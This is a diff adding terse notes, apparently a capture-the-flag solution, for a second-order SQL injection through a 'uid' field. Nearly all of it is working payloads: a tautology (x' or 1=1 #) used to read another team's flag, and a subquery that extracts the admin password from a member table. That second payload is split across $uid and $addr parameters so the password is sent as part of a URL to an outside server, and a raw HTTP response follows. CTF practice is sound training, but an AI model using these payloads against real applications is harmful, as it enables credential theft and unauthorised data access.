@@ -1,0 +1,26 @@
+second-order injection in uid
+
+
+1.
+join with uid
+x' or 1=1 #
+
+see other team's flag
+
+
+2.
+x:asjdfiadsjio
+
+
+x',(SELECT concat(', ',upw) from member where uid=0x61646d696e)) -- -' )
+
+
+$uid    x',(SELECT concat(
+$addr   http://server:1231/,upw) from member where uid=0x61646d696e)) -- -
+
+
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 3
+
+wow
